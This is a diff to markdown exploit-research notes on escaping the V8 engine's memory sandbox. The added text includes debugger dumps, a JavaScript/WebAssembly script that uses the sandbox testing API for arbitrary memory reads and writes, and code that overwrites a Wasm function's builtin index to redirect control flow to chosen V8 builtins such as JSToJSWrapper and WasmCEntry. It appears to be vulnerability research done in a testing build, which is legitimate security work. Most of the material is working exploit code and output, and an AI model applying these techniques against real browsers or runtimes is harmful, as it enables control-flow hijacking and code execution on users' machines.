@@ -4,6 +4,7 @@
 - [PopAndReturn](#popandreturn)
    - [Idea 1: overwriting `0x7fffffffd548` return address of JSWasmWrapperHelper](#idea-1-overwriting-0x7fffffffd548-return-address-of-jswasmwrapperhelper)
    - [Idea 2: Understanding Torque](#idea-2-understanding-torque)
+   - [Idea 3: Overwrite `v8::internal::Histogram *__hidden this` pointer of `AddSample` function](#idea-3-overwrite-v8internalhistogram-__hidden-this-pointer-of-addsample-function)
 
 
 
@@ -605,7 +606,7 @@ Stacktrace:
 ```js
 Builtins_JSToWasmWrapper
 // ...
-
+Builtins_CallFunction_ReceiverIsAny
 Builtins_Call_ReceiverIsAny
 Builtins_JSEntryTrampoline
 ```
@@ -648,5 +649,298 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555556ae74d0 <Builtins_CallFunction_ReceiverIsAny+272>    shl    ecx, 4
  ► 0x555556ae74d3 <Builtins_CallFunction_ReceiverIsAny+275>    mov    rcx, qword ptr [r10 + rcx]
    0x555556ae74d7 <Builtins_CallFunction_ReceiverIsAny+279>    jmp    rcx
+/// ========================================================================
 
+DebugPrint: 0xb82002dcab9: [Function] in OldSpace
+ - map: 0x0b8200292335 <Map[28](HOLEY_ELEMENTS)> [FastProperties]
+ - prototype: 0x0b8200281dc9 <JSFunction (sfi = 0xb82001474b1)>
+ - elements: 0x0b8200000725 <FixedArray[0]> [HOLEY_ELEMENTS]
+ - function prototype: <no-prototype-slot>
+ - shared_info: 0x0b82002dca89 <SharedFunctionInfo js-to-wasm:l:l>
+ - name: 0x0b8200002809 <String[1]: #1>
+ - builtin: JSToWasmWrapper
+ - formal_parameter_count: 1
+ - kind: NormalFunction
+ - context: 0x0b8200281729 <NativeContext[295]>
+ - code: 0x0b8200265611 <Code BUILTIN JSToWasmWrapper>
+ - Wasm instance data: 0x3fcc000c48e5 <Other heap object (WASM_TRUSTED_INSTANCE_DATA_TYPE)>
+ - Wasm function index: 1
+ - properties: 0x0b8200000725 <FixedArray[0]>
+ - All own properties (excluding elements): {
+    0xb8200000d99: [String] in ReadOnlySpace: #length: 0x0b8200271695 <AccessorInfo name= 0x0b8200000d99 <String[6]: #length>, data= 0x0b8200000069 <undefined>> (const accessor descriptor, attrs: [__C]), location: descriptor
+    0xb8200000dc5: [String] in ReadOnlySpace: #name: 0x0b820027167d <AccessorInfo name= 0x0b8200000dc5 <String[4]: #name>, data= 0x0b8200000069 <undefined>> (const accessor descriptor, attrs: [__C]), location: descriptor
+    0xb820000420d: [String] in ReadOnlySpace: #arguments: 0x0b820027164d <AccessorInfo name= 0x0b820000420d <String[9]: #arguments>, data= 0x0b8200000069 <undefined>> (const accessor descriptor, attrs: [___]), location: descriptor
+    0xb820000448d: [String] in ReadOnlySpace: #caller: 0x0b8200271665 <AccessorInfo name= 0x0b820000448d <String[6]: #caller>, data= 0x0b8200000069 <undefined>> (const accessor descriptor, attrs: [___]), location: descriptor
+ }
+ - feedback vector: feedback metadata is not available in SFI
+0xb8200292335: [Map] in OldSpace
+ - map: 0x0b82002816d9 <MetaMap (0x0b8200281729 <NativeContext[295]>)>
+ - type: JS_FUNCTION_TYPE
+ - instance size: 28
+ - inobject properties: 0
+ - unused property fields: 0
+ - elements kind: HOLEY_ELEMENTS
+ - enum length: invalid
+ - stable_map
+ - callable
+ - back pointer: 0x0b8200000069 <undefined>
+ - prototype_validity cell: 0x0b8200000a89 <Cell value= 1>
+ - instance descriptors (own) #4: 0x0b820029235d <DescriptorArray[4]>
+ - prototype: 0x0b8200281dc9 <JSFunction (sfi = 0xb82001474b1)>
+ - constructor: 0x0b8200281e6d <JSFunction Function (sfi = 0xb820027692d)>
+ - dependent code: 0x0b8200000735 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
+ - construction counter: 0;
+/// =============================================
+
+0x1a4b001dca81 <JSFunction js-to-wasm:l:l (sfi = 0x1a4b001dca51)>
+pwndbg> x/20wx 0x2acd001dca81-1
+0x2acd001dca80:	0x00192335	0x00000725	0x00000725	0x002bf801
+0x2acd001dca90:	0x001dca51	0x00181729	0x001400a9	0x001816d9
+0x2acd001dcaa0:	0x30060307	0x0d000421	0x0a400fff	0x00000085
+0x2acd001dcab0:	0x00182139	0x00200025	0x00000735	0x00000a89
+0x2acd001dcac0:	0x00000000	0x001816d9	0x30060307	0x2d000421
+
+ RDI  0x2acd0018f19d ◂— 0x250000072500181f
+ *RDI  0x2acd001dca81 ◂— 0x2500000725001923
+```
+
+### Jump function decoder
+
+```js
+// r --expose-gc --allow-natives-syntax --sandbox-testing    --experimental-wasm-memory64 ../../../tests/t10.js
+
+d8.file.execute('/home/vult/Desktop/v8/v8/test/mjsunit/wasm/wasm-module-builder.js');
+let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
+
+function addrOf(obj) {
+    return Sandbox.getAddressOf(obj);
+  }
+  
+  function v8_read64(addr) {
+    return sandboxMemory.getBigUint64(Number(addr), true);
+  }
+  
+  function v8_write64(addr, val) {
+    return sandboxMemory.setBigInt64(Number(addr), val, true);
+  }
+  function v8_read32(addr) {
+    // return sandboxMemory.getBigUint32(Number(addr), true);
+    return BigInt(sandboxMemory.getUint32(Number(addr), true));
+    }
+
+function v8_write32(addr, val) {
+// return sandboxMemory.setBigInt32(Number(addr), val, true);
+return sandboxMemory.setUint32(Number(addr), val, true);
+}
+
+console.log("[*] Leak sandbox base address");
+// ================= reading heap_base =============================
+let heap_addr = BigInt(Sandbox.base);
+console.log("heap_addr: 0x" + heap_addr.toString(16));
+let target_page = BigInt(Sandbox.targetPage);
+console.log("target_page: 0x" + target_page.toString(16));
+// ================================================================
+
+const builder = new WasmModuleBuilder();
+builder.exportMemoryAs("mem0", 0);
+const GB = 1024 * 1024 * 1024;
+let $mem0 = builder.addMemory64(1 * GB / kPageSize);
+
+let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);
+
+let $sig_i_l = builder.addType(kSig_i_l); //let kSig_i_l = makeSig([kWasmI64], [kWasmI32]);
+// let $Sig_i_iii = builder.addType(kSig_i_iii);
+
+builder.addFunction("func0", kSig_v_l).exportFunc().addBody([ // func 0 receive a int32 and write to that address??
+//let kSig_v_i = makeSig([kWasmI32], []);
+  kExprLocalGet, 0,
+  ...wasmI32Const(0x41414141),
+  kExprI32StoreMem, 0, 0, // i32.store offset = -1
+]);
+builder.addFunction("func1", builder.addType(kSig_l_l)).exportFunc().addBody([ // function 1 convert from int32 to int64
+  kExprLocalGet, 0,
+//   kExprI32ConvertI64,
+  kExprI64Const, 0x81, 0x80, 0x80, 0x80, 0x10,
+  kExprI64Mul,
+]);
+
+
+let instance = builder.instantiate();
+
+instance.exports.func1(0n);
+
+%DebugPrint(instance.exports.func1);
+// ===============================
+// 0x2a7ada
+// %SystemBreak();
+let id_builtins_function = Number(v8_read32(addrOf(instance.exports.func1)+0xb+1));
+console.log("0x" + id_builtins_function.toString(16));
+v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - 0x200);
+console.log("0x" + v8_read32(addrOf(instance.exports.func1)+0xb+1).toString(16));
+
+
+// trigger
+instance.exports.func1(0x4141n);
+// ================================
+
+```
+Explaining:
+```js
+v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - 0x200);
+/// 
+ RAX  0x2
+ RBX  0x0
+*RCX  0x2bf601
+ RDX  0x328e00000069 ◂— 0x4
+ RDI  0x328e001dccfd ◂— 0x2500000725001923
+ RSI  0x328e00181729 ◂— 0x450000024e001817
+ R8   0x328e00199cd9 ◂— 0x3d0000001a001902
+ R9   0xfffffffffffffff7
+ R10  0x7fff98000000 ◂— 0x0
+*R11  0xd2
+ R12  0x209300000629 ◂— 0x8c00400200000009 /* '\t' */
+ R13  0x555556fa6080 —▸ 0x555556ae6f00 (Builtins_AdaptorWithBuiltinExitFrame) ◂— mov ecx, dword ptr [rdi + 0xf]
+ R14  0x328e00000000 ◂— 0x40940
+ R15  0x4f5
+ RBP  0x7fffffffd620 —▸ 0x7fffffffd648 —▸ 0x7fffffffd6c0 —▸ 0x7fffffffd820 —▸ 0x7fffffffd890 ◂— ...
+ RSP  0x7fffffffd590 —▸ 0x555556af2ca7 (Builtins_InterpreterEntryTrampoline+295) ◂— mov r12, qword ptr [rbp - 0x20]
+ RIP  0x555556ae74cd (Builtins_CallFunction_ReceiverIsAny+269) ◂— shr ecx, 9
+───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────
+   0x555556ae74c3 <Builtins_CallFunction_ReceiverIsAny+259>    mov    r10, qword ptr [r13 + 0x2510]
+   0x555556ae74ca <Builtins_CallFunction_ReceiverIsAny+266>    mov    ecx, dword ptr [rdi + 0xb]
+ ► 0x555556ae74cd <Builtins_CallFunction_ReceiverIsAny+269>    shr    ecx, 9
+   0x555556ae74d0 <Builtins_CallFunction_ReceiverIsAny+272>    shl    ecx, 4
+   0x555556ae74d3 <Builtins_CallFunction_ReceiverIsAny+275>    mov    rcx, qword ptr [r10 + rcx]
+   0x555556ae74d7 <Builtins_CallFunction_ReceiverIsAny+279>    jmp    rcx
+
+// =========================
+0x328e001dccfd <JSFunction js-to-wasm:l:l (sfi = 0x328e001dcccd)>
+pwndbg> x/20wx 0x328e001dccfd-1
+0x328e001dccfc:	0x00192335	0x00000725	0x00000725	0x002bf601
+0x328e001dcd0c:	0x001dcccd	0x00181729	0x001400a9	0x001816d9
+// ===============================
+pwndbg> tele 0x7fff98000000+0x15fc0
+00:0000│  0x7fff98015fc0 —▸ 0x555556c5fcc0 (Builtins_JSToWasmWrapper) ◂— push rbp
+01:0008│  0x7fff98015fc8 —▸ 0x328e0003c1b8 ◂— 0x2bf80100000d61 /* 'a\r' */
+02:0010│  0x7fff98015fd0 —▸ 0x555556c60b80 (Builtins_WasmPromisingWithSuspender) ◂— push rbp
+03:0018│  0x7fff98015fd8 —▸ 0x328e0003c1f4 ◂— 0x2bfa0100000d61 /* 'a\r' */
+04:0020│  0x7fff98015fe0 —▸ 0x555556c61a00 (Builtins_WasmPromising) ◂— push rbp
+05:0028│  0x7fff98015fe8 —▸ 0x328e0003c230 ◂— 0x2bfc0100000d61 /* 'a\r' */
+06:0030│  0x7fff98015ff0 ◂— 0xff555556c62840
+07:0038│  0x7fff98015ff8 —▸ 0x328e0003c26c ◂— 0x2bfe0100000d61 /* 'a\r' */
+
+```
+`rdi` is wasm exported function `func1`
+`$rdi+0xb` is a id decoder function ->  `Builtins_JSToWasmWrapper`
+if we changes this value, we can point rcx to whatever functions...
+
+**How to exploit it?**
+Bruteforce
+State before `jump rcx`
+```go
+pwndbg> 
+0x0000555556ae74d7 in Builtins_CallFunction_ReceiverIsAny ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────
+ RAX  0x2
+ RBX  0x0
+*RCX  0x555556c5f080 (Builtins_JSToJSWrapper) ◂— push rbp
+ RDX  0x328e00000069 ◂— 0x4
+ RDI  0x328e001dccfd ◂— 0x2500000725001923
+ RSI  0x328e00181729 ◂— 0x450000024e001817
+ R8   0x328e00199cd9 ◂— 0x3d0000001a001902
+ R9   0xfffffffffffffff7
+ R10  0x7fff98000000 ◂— 0x0
+ R11  0xd2
+ R12  0x209300000629 ◂— 0x8c00400200000009 /* '\t' */
+ R13  0x555556fa6080 —▸ 0x555556ae6f00 (Builtins_AdaptorWithBuiltinExitFrame) ◂— mov ecx, dword ptr [rdi + 0xf]
+ R14  0x328e00000000 ◂— 0x40940
+ R15  0x4f5
+ RBP  0x7fffffffd620 —▸ 0x7fffffffd648 —▸ 0x7fffffffd6c0 —▸ 0x7fffffffd820 —▸ 0x7fffffffd890 ◂— ...
+ RSP  0x7fffffffd590 —▸ 0x555556af2ca7 (Builtins_InterpreterEntryTrampoline+295) ◂— mov r12, qword ptr [rbp - 0x20]
+*RIP  0x555556ae74d7 (Builtins_CallFunction_ReceiverIsAny+279) ◂— jmp rcx
+───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────
+   0x555556ae74cd <Builtins_CallFunction_ReceiverIsAny+269>    shr    ecx, 9
+   0x555556ae74d0 <Builtins_CallFunction_ReceiverIsAny+272>    shl    ecx, 4
+   0x555556ae74d3 <Builtins_CallFunction_ReceiverIsAny+275>    mov    rcx, qword ptr [r10 + rcx]
+ ► 0x555556ae74d7 <Builtins_CallFunction_ReceiverIsAny+279>    jmp    rcx   
+```
+
+**Solution 1**
+```js
+// =============== jump to Builtins_JSToJSWrapper ====================
+// RDI  0x3e3a001dccfd ◂— 0x2500000725001923
+// RSI  0x3e3a00181729 ◂— 0x450000024e001817
+// R8   0x3e3a001dcccd ◂— 0xfe0040640000000d /* '\r' */
+// 0x3e3a001dccfd <JSFunction js-to-wasm:l:l (sfi = 0x3e3a001dcccd)>
+// .text:0000555556C5F09F                 mov     r11d, [r8+3]
+v8_write32(addrOf(instance.exports.func1)+1-0x30+3, 0); // .text:0000555556C5F0A3                 test    r11d, r11d
+v8_write32(addrOf(instance.exports.func1)+1-0x30+7, 0x2f0000); // .text:0000555556C5F0A8                 mov     r8d, [r8+7]
+
+v8_write32(0x2f0000+0x13, 0x500-7)
+// 0x1984f1
+// ==================================================================
+```
+Some functions we can jump:
+```js
+pwndbg> tele 0x7fff98000000+0x15000
+00:0000│  0x7fff98015000 —▸ 0x555556bfc700 (Builtins_MathLog) ◂— push rbp
+01:0008│  0x7fff98015008 —▸ 0x30a4000386a8 ◂— 0x2a000100000d61 /* 'a\r' */
+02:0010│  0x7fff98015010 —▸ 0x555556bfc840 (Builtins_MathLog1p) ◂— push rbp
+03:0018│  0x7fff98015018 —▸ 0x30a4000386e4 ◂— 0x2a020100000d61 /* 'a\r' */
+04:0020│  0x7fff98015020 —▸ 0x555556bfc980 (Builtins_MathLog10) ◂— push rbp
+05:0028│  0x7fff98015028 —▸ 0x30a400038720 ◂— 0x2a040100000d61 /* 'a\r' */
+06:0030│  0x7fff98015030 —▸ 0x555556bfcac0 (Builtins_MathLog2) ◂— push rbp
+07:0038│  0x7fff98015038 —▸ 0x30a40003875c ◂— 0x2a060100000d61 /* 'a\r' */
+pwndbg> 
+08:0040│  0x7fff98015040 —▸ 0x555556bfcc00 (Builtins_MathSin) ◂— push rbp
+09:0048│  0x7fff98015048 —▸ 0x30a400038798 ◂— 0x2a080100000d61 /* 'a\r' */
+0a:0050│  0x7fff98015050 —▸ 0x555556bfcd40 (Builtins_MathSign) ◂— push rbp
+0b:0058│  0x7fff98015058 —▸ 0x30a4000387d4 ◂— 0x2a0a0100000d61 /* 'a\r' */
+0c:0060│  0x7fff98015060 —▸ 0x555556bfce00 (Builtins_MathSinh) ◂— push rbp
+0d:0068│  0x7fff98015068 —▸ 0x30a400038810 ◂— 0x2a0c0100000d61 /* 'a\r' */
+0e:0070│  0x7fff98015070 —▸ 0x555556bfcf40 (Builtins_MathSqrt) ◂— push rbp
+0f:0078│  0x7fff98015078 —▸ 0x30a40003884c ◂— 0x2a0e0100000d61 /* 'a\r' */
+pwndbg> 
+10:0080│  0x7fff98015080 —▸ 0x555556bfd080 (Builtins_MathTan) ◂— push rbp
+11:0088│  0x7fff98015088 —▸ 0x30a400038888 ◂— 0x2a100100000d61 /* 'a\r' */
+12:0090│  0x7fff98015090 —▸ 0x555556bfd1c0 (Builtins_MathTanh) ◂— push rbp
+13:0098│  0x7fff98015098 —▸ 0x30a4000388c4 ◂— 0x2a120100000d61 /* 'a\r' */
+14:00a0│  0x7fff980150a0 —▸ 0x555556bfd300 (Builtins_MathHypot) ◂— push rbp
+15:00a8│  0x7fff980150a8 —▸ 0x30a400038900 ◂— 0x2a140100000d61 /* 'a\r' */
+16:00b0│  0x7fff980150b0 —▸ 0x555556bfdd40 (Builtins_MathRandom) ◂— push rbp
+17:00b8│  0x7fff980150b8 —▸ 0x30a40003893c ◂— 0x2a160100000d61 /* 'a\r' */
+pwndbg> 
+18:00c0│  0x7fff980150c0 —▸ 0x555556bfde80 (Builtins_NumberPrototypeToString) ◂— push rbp
+19:00c8│  0x7fff980150c8 —▸ 0x30a400038978 ◂— 0x2a180100000d61 /* 'a\r' */
+1a:00d0│  0x7fff980150d0 —▸ 0x555556bfe900 (Builtins_NumberIsFinite) ◂— push rbp
+1b:00d8│  0x7fff980150d8 —▸ 0x30a4000389b4 ◂— 0x2a1a0100000d61 /* 'a\r' */
+1c:00e0│  0x7fff980150e0 —▸ 0x555556bfe9c0 (Builtins_NumberIsInteger) ◂— push rbp
+1d:00e8│  0x7fff980150e8 —▸ 0x30a4000389f0 ◂— 0x2a1c0100000d61 /* 'a\r' */
+1e:00f0│  0x7fff980150f0 —▸ 0x555556bfeb40 (Builtins_NumberIsNaN) ◂— push rbp
+1f:00f8│  0x7fff980150f8 —▸ 0x30a400038a2c ◂— 0x2a1e0100000d61 /* 'a\r' */
+pwndbg> 
+20:0100│  0x7fff98015100 —▸ 0x555556bfebc0 (Builtins_NumberIsSafeInteger) ◂— push rbp
+21:0108│  0x7fff98015108 —▸ 0x30a400038a68 ◂— 0x2a200100000d61 /* 'a\r' */
+22:0110│  0x7fff98015110 —▸ 0x555556bfed40 (Builtins_NumberPrototypeValueOf) ◂— push rbp
+23:0118│  0x7fff98015118 —▸ 0x30a400038aa4 ◂— 0x2a220100000d61 /* 'a\r' */
+24:0120│  0x7fff98015120 —▸ 0x555556bfee40 (Builtins_NumberParseFloat) ◂— push rbp
+25:0128│  0x7fff98015128 —▸ 0x30a400038ae0 ◂— 0x2a240100000d61 /* 'a\r' */
+//==============================
+
+
+Builtins_MathLog
+```
+
+
+```js
+// Builtins_WasmCEntry
+v8_write32(BigInt(addrOf(instance.exports.func1)+0xb+1), id_builtins_function - (0x15fc-0x12d4)*0x200);
+
+/// asm 
+.text:0000555556B924FD loc_555556B924FD:                       ; CODE XREF: Builtins_WasmCEntry+3D↑j
+.text:0000555556B924FD                 mov     rdi, rax
+.text:0000555556B92500                 mov     rsi, r15
+.text:0000555556B92503                 lea     rdx, [r13-80h]
+.text:0000555556B92507                 call    rbx
 ```
